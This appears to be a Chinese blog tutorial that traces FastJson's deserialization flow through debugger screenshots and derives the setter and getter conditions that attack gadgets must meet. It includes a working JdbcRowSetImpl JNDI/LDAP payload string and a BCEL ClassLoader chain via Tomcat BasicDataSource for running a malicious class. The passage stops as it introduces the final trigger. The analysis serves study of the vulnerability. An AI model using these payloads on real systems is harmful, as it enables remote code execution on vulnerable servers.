+<h3 id="FastJson根据字符串任意反序列化"><a href="#FastJson根据字符串任意反序列化" class="headerlink" title="FastJson根据字符串任意反序列化"></a>FastJson根据字符串任意反序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson_Learning</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">String JSON_Serialize=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;ttt\&quot;&#125;&quot;</span>;</span><br><span class="line">Person o3=JSON.parseObject(JSON_Serialize, Person.class);  </span><br><span class="line">System.out.println(o3.getName());</span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>假如说我们在JSON数据中加入”@type”字段，我们就可以指定加载任意类了 比如说这里的org.example.Person就是指定的地址<br>效果图如下<br><img src="https://stoocea.github.io/images/FastJson/3.png">)</p>
+<p>发现不论是执行set方法还是我们自己指定的get方法，都是可以正常执行的，而且constructor构造方法也能执行，这个时候就嗅到一丝味道了，我们客户端能够控制输入，并且服务端能够根据传入的数据执行不同的代码逻辑，就很像是一句话木马的意思，我们跟进他的具体方法内容以及流程分析一下</p>
+<h2 id="FastJson反序列化流程分析"><a href="#FastJson反序列化流程分析" class="headerlink" title="FastJson反序列化流程分析"></a>FastJson反序列化流程分析</h2><p>如果说选择指定加载的对象类型，跟进到parseObejct方法，流程回不一样，但处理的类都是差不多的，这里我们选择用单字符串的加载，就是仅加载我们客户端指定的对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson_Learning</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">String JSON_Serialize=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;ttt\&quot;&#125;&quot;</span>;</span><br><span class="line">JSONObject o3=JSON.parseObject(JSON_Serialize);  </span><br><span class="line">System.out.println(o3);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="type指定加载类"><a href="#type指定加载类" class="headerlink" title="@type指定加载类"></a>@type指定加载类</h3><p>在JSON.parseObject行下个断点，然后跟进去<br><img src="https://stoocea.github.io/images/FastJson/4.png">)<br>来到JSON类的parseObject方法，他这里会继续调用parse方法，继续跟进</p>
+<p><img src="https://stoocea.github.io/images/FastJson/5.png">)<br>稍显套娃<br><img src="https://stoocea.github.io/images/FastJson/7.png">)</p>
+<p>两个parse方法紧挨着，当调用到第二个parse方法时，开始调用DefaultJSONParser类的构造方法，也就是获取到一个解析器去解析我们传过来的JSON数据<br>具体构造就不看了，我们跟进到下面的parser.parse方法调用</p>
+<p>来到DefaultJSONParser类的parse方法,这里就会将我们的传过来的json字符串<br><code>&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;ttt\&quot;&#125;</code><br>从左往右一个一个字符去解析<br> 比如第一个是{ 左大括号 ,那就调用到 LBRACE的内容<br><img src="https://stoocea.github.io/images/FastJson/8.png">)</p>
+<p>先是实例化一个左大括号的JSON对象,然后返回 parseObject方法调用结果,继续跟进</p>
+<p>由于接下来的parseObject内容过多,只截取部分关键代码记录过程<br>刚进方法的时候,先把我们传进来的字符串转化为一个对象,该对象的类型是一个键值对（JSON格式）<br>然后就是边界的确定和检测，之后就开始一个字符一个字符的进行加载<br><img src="https://stoocea.github.io/images/FastJson/9.png">)</p>
+<p>说它代码量较多的原因就是因为下面的try—catch的内容<br>先截取一部分理解<br><img src="https://stoocea.github.io/images/FastJson/10.png">)</p>
+<p>这里有一个for的死循环，他里面的内容必须要有return或者break才能出来，这里调试的时候并没有循环很多次，一次出来，其实这个for循环的作用是根据”,”来给JSON分类，也就是对JSON数据处理，下面会对区分的部分进行匹配<br>就比如说for循环出来之后他就匹配到第一个” “里面的内容 @tpye字符，将他获取出来<br><img src="https://stoocea.github.io/images/FastJson/11.png">)</p>
+<p>之后继续跟进到如下地方<br><img src="https://stoocea.github.io/images/FastJson/12.png">)</p>
+<p>这边会首先进行一个判断，是否为<code>JSON.DEFAULT_TYPE_KEY</code>  其实这个就是”@type”<br>所以进入该if语句的内容，关键点肯定是这个loadClass，我们跟进<br>内容较多，总结一下功能实现：<br>先判断我们传进来的className是否为空，或者是否存在，然后进行下一步</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (className == <span class="literal">null</span> || className.length() == <span class="number">0</span>) &#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>之后判断是否在本地缓存中已经加载过了，如果有就直接放回</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = mappings.get(className);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line"><span class="keyword">return</span> clazz;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就是一些特殊情况的判断 数组之类的</p>
+<p>最后调用上下文的classLoader来加载这个指定类，然后将他放到缓存中，最终返回</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span>) &#123;  </span><br><span class="line">clazz = contextClassLoader.loadClass(className);  </span><br><span class="line">mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> clazz;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要注意的是，这一步确实是加载到了指定的类，但是类里面我们指定的属性值还没有赋值进去，所以之后还需要经过一层FastJson特有的反序列化操作将这些事情做完</p>
+<h3 id="对指定类的参数处理"><a href="#对指定类的参数处理" class="headerlink" title="对指定类的参数处理"></a>对指定类的参数处理</h3><p>继续调试跟进来到这部分处理，也就是@type指定加载类之后，我们后续的对于类中属性值如何赋值的流程</p>
+<h4 id="获取构造器"><a href="#获取构造器" class="headerlink" title="获取构造器"></a>获取构造器</h4><p><img src="https://stoocea.github.io/images/FastJson/13.png">)</p>
+<p><code>config.getDeserializer</code><br>首先根据我们刚才加载到的calzz来获取一个解析器<br><code>deserializer.deserialze</code><br>然后调用该解析器的deserialze方法</p>
+<p>我们首先来看解析器的获取<br><img src="https://stoocea.github.io/images/FastJson/14.png">)</p>
+<p>他这里其实也有一个本地缓存的解析器获取的过程，其实就是在本地写了一些put操作，把可能用到的解析器都put到derializers中，这是我们自己定义的类，肯定是没有的，我们跟进到下面的getDeserializer方法<br>只提几点需要注意的：<br>这里有一个获取java注解的功能，相当于自己写一个解析器的功能，但是基本上用不到，因为控制端不在客户端，我们无法控制<br><img src="https://stoocea.github.io/images/FastJson/15.png">)</p>
+<p>然后会进入一个for循环去匹配他的黑名单，这里的黑名单不是对FastJson反序列化攻击的waf，而是有些bug限制，或者说是性能上的限制<br><img src="https://stoocea.github.io/images/FastJson/16.png">)</p>
+<p>最后的时候，经过一些列的if判断，会调用到createJavaBeanDeserializer这个方法来创建一个javaBean的解析器来对我们的指定类进行反序列化<br><img src="https://stoocea.github.io/images/FastJson/17.png">)</p>
+<p>继续跟进就行<br>对于createJavaBeanDeserializer方法来说，前面很多内容都是关于asm能不能用的判断，跟我们这次反序列化调试流程没有太大关系，我们直接跳到关键步骤</p>
+<p>来到下一个步骤 调用JavaBeanInfo.build方法，这是一个比较关键的方法，指定对象中的属性值和构造方法就是在这里被访问的<br><img src="https://stoocea.github.io/images/FastJson/18.png">)</p>
+<p>继续跟进<br>首先是各类值的获取，包括是否有注解，以及属性值的获取，还有构造方法的获取<br><img src="https://stoocea.github.io/images/FastJson/19.png">)</p>
+<p>之后就是一段if判断<br><code>if (defaultConstructor == null &amp;&amp; !(clazz.isInterface() || Modifier.isAbstract(clazz.getModifiers())))</code><br>判断一下指定类的默认构造是否获取正常，然后判断指定类是否为接口或者抽象类，显然我们整个攻击流程都不会进入这个if判断的内容，我们接着往下走<br>判断一下构造方法是否存在，然后给方法设置一下Acessible权限<br><img src="https://stoocea.github.io/images/FastJson/20.png">)</p>
+<p>之后是三段长for循环内容<br><img src="https://stoocea.github.io/images/FastJson/21.png">)</p>
+<p>我们先看整体结构了解这最后的三段for循环是在干什么<br>第一次和第三次for循环的条件是Method，具体一点是，第一次for是在获取set方法，而第三次for循环是在获取get方法<br>中间的for循环条件是字段属性值，个人猜测是获取到构造方法后对指定类的值进行处理</p>
+<p>我们先看第一段for循环的内容<br>获取所有方法，然后对每个方法进行4个判断<br><img src="https://stoocea.github.io/images/FastJson/22.png">)</p>
+<ul>
+<li>1.如果该方法名字符数量小于4，不做进一步处理，continue</li>
+<li>2.如果该方法是静态方法，continue</li>
+<li>3.如果该方法的返回值不为空，continue</li>
+<li>4.获取到该方法的参数数量，如果不为1，contine</li>
+</ul>
+<p>其实总结下来，他其实就是在寻找set方法，也就是我们指定类中的setName等赋值的方法，这也就是为什么FastJson能转化的类只能是javabean，因为javabean必须要有set和get方法</p>
+<p>之后就是各种特殊情况的判断，全体转小写之类的处理，直接跟进到最后的add方法</p>
+<p><img src="https://stoocea.github.io/images/FastJson/23.png">)</p>
+<p>add之前肯定是里面FieldInfo()构造方法实现，这里不做过多的代码展示<br><img src="https://stoocea.github.io/images/FastJson/24.png">)</p>
+<p>这一块有一个比较重要的内容，就是getOnly这个参数的设置，他的判断是：如果我们现在给定的set方法的参数值不唯一，getOnly参数设置为true，如果set方法只有一个参数，就进入if内容，不会设置getOnly，记录一下，之后会碰到，涉及到asm的开关，也就是会不会产生asm构造器来解析JSON数据<br><img src="https://stoocea.github.io/images/FastJson/25.png">)</p>
+<p>至于为什么不用asm生成的解析器，是因为asm的解析器是一个临时创建的类，我们跟进分析不到，其实后面的分析流程可以不用看了，我们重新跟进一遍，只不过这一遍需要我们稍作处理，也就是上面这两个if条件。<br>第一个肯定容易满足，这个方法是否存在，这个没啥好说的 第二个是当前方法传入的参数的数量不为1，也就是我们这个set方法传入参数数量不能为1，以为很好满足，实际上这第一个for循环有一个判断<br>如果参数数量不为1就给我continue下一个了<br><img src="https://stoocea.github.io/images/FastJson/26.png">)</p>
+<p>也就是说第一个for循环关于getOnly的设置是不存在的，既然他叫getOnly，理应考虑第三个for循环，get方法获取的内容</p>
+<p>其实第三个for循环的内容重要区别就在于，他没这段if(types.lengths!&#x3D;1)的判断了，但是多了两层我们好实现的判断<br>一个是参数值是0即可绕过<br><img src="https://stoocea.github.io/images/FastJson/28.png">)</p>
+<p>一个是只有该方法的返回类型满足下面这几个即可<br><img src="https://stoocea.github.io/images/FastJson/27.png">)</p>
+<p>后续的add方法，以及FiledInfo创建的内容都是一样的，所以除了满足上述两个条件，接下来只需满足getOnly前的两段if即可，而这两段if早在参数值为0时就已经算是绕过了，因为一层为判断该方法是否为空，另一个就是判断该方法参数数量是否为1</p>
+<p>改一下我们的这个指定类的属性值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> String name;  </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line"><span class="keyword">private</span> Map map;  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line"><span class="keyword">return</span> name;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;  </span><br><span class="line">System.out.println(<span class="string">&quot;constructor&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line"><span class="built_in">this</span>.name = name;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line"><span class="keyword">return</span> age;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">System.out.println(<span class="string">&quot;setAge&quot;</span>);  </span><br><span class="line"><span class="built_in">this</span>.age = age;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> Map <span class="title function_">getMap</span><span class="params">()</span>&#123;  </span><br><span class="line">System.out.println(<span class="string">&quot;getMap&quot;</span>);  </span><br><span class="line"><span class="keyword">return</span> map;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实也就是多了个类型为map的属性值，然后关于该属性值的方法，只有get方法，没有set方法，且参数值为0即可</p>
+<p>之后我们重新调试一遍来到第三遍for循环，然后直接跳到add方法中的FieldInfo构造方法，运行下来发现进入了else的内容，将getonly设置为true<br><img src="https://stoocea.github.io/images/FastJson/29.png">)</p>
+<p>所以到目前为止，我们有了一个拥有getonly为true的build返回值了也就是FiledInfo中包含map字段<br>这个时候其实当我们跳出build方法，继续ParseConfig的流程，发现他会遍历我们的刚才生成的FiledInfo，依次寻找构造器，而当遍历到mapinfo的时候<br><img src="https://stoocea.github.io/images/FastJson/30.png">)</p>
+<p>他会把asmEnable这个开关关闭，改成false<br>然后就是重新调用构造一遍FieldIinfo，构造完毕之后完成，彻底创建好了这个javabeandeserialzer，开始调用它的deserialze方法</p>
+<h4 id="调用构造器的deserialze方法进行最终解析"><a href="#调用构造器的deserialze方法进行最终解析" class="headerlink" title="调用构造器的deserialze方法进行最终解析"></a>调用构造器的deserialze方法进行最终解析</h4><p>deserialze这里的代码内容依然很多，我们只讲关键部分的遍历FieldInfo<br>在这个遍历到for循环之前，deserialze的主要工作是对于JSON数据边界的一个识别，还有一些默认的检测<br><img src="https://stoocea.github.io/images/FastJson/31.png">)</p>
+<p>先获取所有字段及其内容，然后就是大段的根据JSON数据的检测，直到开始实例化指定的对象，具体内容就不看了</p>
+<p><img src="https://stoocea.github.io/images/FastJson/32.png">)</p>
+<p>实例化之后就是调用里面的set和get方法了，先是调用set<br><img src="https://stoocea.github.io/images/FastJson/33.png">)</p>
+<p>里面很多if判断用来提前准备，具体内容对整体流程没有影响，最终也只是直接invoke调用set方法</p>
+<p><img src="https://stoocea.github.io/images/FastJson/34.png">)</p>
+<p>然后看一下Console，已经进行完了构造函数以及set方法<br><img src="https://stoocea.github.io/images/FastJson/35.png">)</p>
+<p>之后就是循环的过程了 一个set一个set的调用。<br>而你会问，我们的get方法是在哪调用的呢？<br>其实是我们进行完最开始的ParseObject方法之后，他最后还调用了JSON.toJSON方法，在toJSON方法里面调用到get方法<br><img src="https://stoocea.github.io/images/FastJson/36.png">)<br>整个反序列化的流程就是这些，我们之后稍微总结一下</p>
+<h2 id="FastJson流程总结以及漏洞点分析"><a href="#FastJson流程总结以及漏洞点分析" class="headerlink" title="FastJson流程总结以及漏洞点分析"></a>FastJson流程总结以及漏洞点分析</h2><p>parseObject方法作为入口进入流程 此时分为了两步 一是先将这个指定的类classLoader加载出来（此时对于里面的set get方法以及属性值都没有操作的）<br>第二步开始获取构造器，准备用构造器来对JSON数据的内容进行解析，解析的过程中调用了set方法去赋值<br>最后解析完毕之后，又调用JSON.toJSON方法触发了get方法去实现</p>
+<p>所以漏洞出在哪呢？其实就是它对指定类的set方法以及get方法调用，会直接执行它方法里面的内容</p>
+<p>我们写一个恶意类执行一下<br><img src="https://stoocea.github.io/images/FastJson/37.png">)</p>
+<p>这里采用set方法去执行恶意方法，执行条件之后总结<br>执行完毕，其实会发现就算不是javabean格式的类 FastJson也会去解析，这是因为在获取构造器的时候，本地没有对应加载器，它都会当作javabean去解析，导致后面的流程其实是一样的</p>
+<p><img src="https://stoocea.github.io/images/FastJson/38.png">)</p>
+<h2 id="FastJson漏洞利用前的流程总结"><a href="#FastJson漏洞利用前的流程总结" class="headerlink" title="FastJson漏洞利用前的流程总结"></a>FastJson漏洞利用前的流程总结</h2><p>这里的内容不仅是为后续的漏洞利用做铺垫，也是为了给之后复习留一点余地，能够快速回忆<br>FastJson提供了一种特有的反序列化方式，当然序列化的数据是JSON格式<br>第一次跟进一步，他会先进入一段parse，也是在这条流程中进行的解析，首先是根据@type来解析指定类，当然这一步还没完。<br>后续他会先获取解析器，在获取解析器的过程中，流程跟进到JavaBeanInfo类中的三段for循环中，这三段for循环分别是获取到所有的set方法，以及获取到所有的public字段，最后是获取到所有的get方法<br>获取解析器完毕之后，我们回到了DefaultJSONParser类，调用该解析器的deserialze方法去调用set方法进行赋值，赋值完毕之后算是真正实例化完毕JSON数据所指定的对象<br>上述第一步parse做完之后，还会进行一次JSON.toJSON方法，也是这里进行的get方法获取变量 </p>
+<p>漏洞直接利用点就出在DefaultJSONParser在获取完解析器之后的调用deserailze方法中，他会直接调用set方法<br>还有一个出自JSON.toJSON方法,这里面直接调用了get方法<br>利用条件的话主要是在DefaultJSONParser中获取构造器的方法—-getDeserializer后续调用到的JavaBeanInfo中三段for的获取</p>
+<ul>
+<li>set方法,如果想要获取到,他的传入参数只能是1个</li>
+<li>get方法,想要能够获取到get方法,必须是map,AtomicBoolean,AtomicInteger,AtomicLong这四个类型,并且传入参数值必须是0</li>
+</ul>
+<h2 id="FastJson反序列化漏洞攻击利用总结"><a href="#FastJson反序列化漏洞攻击利用总结" class="headerlink" title="FastJson反序列化漏洞攻击利用总结"></a>FastJson反序列化漏洞攻击利用总结</h2><p>首先需要提出，FastJson的序列化不是调用到的原生的序列化，这个是他自己根据JSON数据实例化出来的对象<br>两者的相同点都是最后会执行恶意方法或者调用静态代码块，进而执行恶意代码</p>
+<p>类比原生反序列化，FastJson的反序列化采用它自己的反序列化器，一个入口点在readObject，一个就在setter或者getter<br>明确目的之后肯定就是一番寻找，这里我们先给出结论，再看有没有可能自己总结出寻找的理由。</p>
+<p>所以要能够当作FastJson的攻击链部分需要满足如下条件<br>如果是Setter</p>
+<blockquote>
+<ol>
+<li>非静态函数</li>
+<li>返回类型为void或者当前类</li>
+<li>参数个数为1</li>
+</ol>
+</blockquote>
+<p>如果是Getter</p>
+<blockquote>
+<p>1.非静态方法<br>2.无参数<br>3.返回类型必须是（或继承自）Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</p>
+</blockquote>
+<p>上述条件都是最后获取构造器的时候三段for循环中的内容，也就是第一段for循环以及第三段for循环，能否获取到指定set或者get方法条件，如果不能获取，那还提什么调用呢？</p>
+<h3 id="入口类-JdbcRowSetImpl分析"><a href="#入口类-JdbcRowSetImpl分析" class="headerlink" title="入口类 JdbcRowSetImpl分析"></a>入口类 JdbcRowSetImpl分析</h3><blockquote>
+<p>JNDI版本限制 至少8u191版本以下<br>FastJson在1.2.24版本<br>必须能够出网</p>
+</blockquote>
+<p>这很明显是一个实现类，这个类里面本来的作用我们先不看，在类中有个很熟悉的地方</p>
+<p><img src="https://stoocea.github.io/images/FastJson/39.png">)</p>
+<p>你会发现它在connect方法中有一段很明显存在JNDI注入的地方,先InitialContext初始化一下,然后就是调用lookup,这里其实就是最后的利用点了,但是事先我们还是得确认一点lookup的参数可控，查看调用之后发现确实可控，那我们继续下一步推进<br>我们再看看哪里调用了connect<br><img src="https://stoocea.github.io/images/FastJson/40.png">)<br>还是同样的类中方法，正好有一个get和set方法，那我们这里该如何取舍呢？首先要知道get方法在FastJson的解析过程中是必须进行完JSON数据解析，也就是调用set之后才能调用到的方法，那假如说我们选定get方法作为节点调入，很容易就在JSON数据解析的时候就被报错catch下来，所以这里我们保险起见采用setAutoCommit方法<br><img src="https://stoocea.github.io/images/FastJson/41.png">)</p>
+<p>EXP如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonEXP</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">  </span><br><span class="line">String s=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8086/AOeSUfWq\&quot;,\&quot;autoCommit\&quot;:0&#125;&quot;</span>;  </span><br><span class="line">JSON.parseObject(s);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里的地址可以通过yakit生成，或者自己起一个JNDI关于LDAP的服务，那既然用了LDAP，其实就有版本限制了，至少是8u191之前的版本，但是又有一个问题不知道是不是我自身问题，就是只有在8u202的较高版本才能找到最终connect方法调用路径</p>
+<h3 id="（Bcel）入口类ClassLoaderEXP分析"><a href="#（Bcel）入口类ClassLoaderEXP分析" class="headerlink" title="（Bcel）入口类ClassLoaderEXP分析"></a>（Bcel）入口类ClassLoaderEXP分析</h3><p>上述是必须出网的攻击，那么这里就学习一种不出网的攻击<br>主要经过的是这个类，其实算是最终利用类了，最终是走到它的loadclass通过字节码来加载类<br><img src="https://stoocea.github.io/images/FastJson/42.png">)</p>
+<p><img src="https://stoocea.github.io/images/FastJson/43.png">)</p>
+<p>直接往前寻找loadclass其实不太现实，很多类加载相关的类都有这个loadclass，这里我们找到了一个tomcat自带的类能够指定选用类加载器，那如果我们指定该classLoader的loadclass就可以实现链子的拼接<br>这个类叫做BasicDataSource，在它的createConnectionFactory方法中实现了这个功能<br><img src="https://stoocea.github.io/images/FastJson/44.png">)<br>找到了该方法后其实下一步就是看这两个参数<strong>driverClassLoader</strong>与<strong>driverClassName</strong>是否可控了，也就是找这两个变量的setter方法</p>
+<p><img src="https://stoocea.github.io/images/FastJson/45.png">)</p>
+<p><img src="https://stoocea.github.io/images/FastJson/46.png">)</p>
+<p>确定完这两个事之后呢，下一件事就是寻找上一步的相关调用了</p>
+<p><img src="https://stoocea.github.io/images/FastJson/47.png">)</p>
+<p><img src="https://stoocea.github.io/images/FastJson/48.png">)</p>
+<p>最终还是在这个类里面的getConnection确定了入口，是getter的入口，而且也满足成为FastJson可获取的那个Getter方法<br>所以链子的话就是 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BasicDataSource::getConnection()-BasicDataSource::createDataSource()-&gt;BasicDataSource::createConnectionFactory()-&gt;(com.sun.org.apache.bcel)ClassLoader::loadclass()</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是在最终loadClass中，还有一些需要前置条件</p>
+<blockquote>
+<p>1.必须要有$$BCEL$$字样 在类名的前8位<br>2.必须执行Utility.encode方法处理一下我们的恶意类字节码</p>
+</blockquote>
+<p>满足这两种条件之后就可以到defineclass通过字节码加载恶意类了</p>
+<p>exp如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">ClassLoader classLoader=<span class="keyword">new</span> <span class="title class_">ClassLoader</span>();  </span><br><span class="line"><span class="type">byte</span>[] bytes=convert(<span class="string">&quot;H:\\javasecurity\\FastJsonlearn\\target\\classes\\org\\example\\Evilclass.class&quot;</span>);  </span><br><span class="line">String code= Utility.encode(bytes,<span class="literal">true</span>);  </span><br><span class="line"><span class="comment">//  </span></span><br><span class="line"><span class="comment">// classLoader.loadClass(&quot;$$BCEL$$&quot;+code).newInstance();  </span></span><br><span class="line">BasicDataSource basicDataSource=<span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();  </span><br><span class="line">basicDataSource.setDriverClassLoader(classLoader);  </span><br><span class="line">basicDataSource.setDriverClassName(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">basicDataSource.getConnection();  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String s) <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line"><span class="comment">//File file=new File(s);  </span></span><br><span class="line"><span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(s));  </span><br><span class="line"><span class="keyword">return</span> code;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当然这个只是模拟一下调用流程，也就是直接运行一下我们的链子，为的是熟悉在调用前的处理</p>
+<p>接下来是通过FastJson触发链子的EXP</p>
